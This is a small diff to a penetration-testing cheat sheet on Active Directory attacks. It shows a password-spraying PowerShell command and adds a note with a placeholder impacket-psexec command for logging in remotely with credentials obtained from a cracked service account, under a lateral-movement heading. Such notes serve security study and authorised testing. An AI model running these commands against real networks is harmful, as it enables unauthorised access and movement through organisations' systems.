@@ -2529,6 +2529,11 @@ We can use an existing implementation (https://web.archive.org/web/2022022519004
 .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
 ```
 
+**Note**: You may use `impacket-psexec` to login with any credentials that you have obtained. E.g. if you have obtained SPN hash for a SQL server, this command would work:
+```
+impacket-psexec sqlserver:<password>@<IP>
+```
+	
 ### AD Lateral Movement
 #### Pass The Hash
 Only for NTLM authentication.
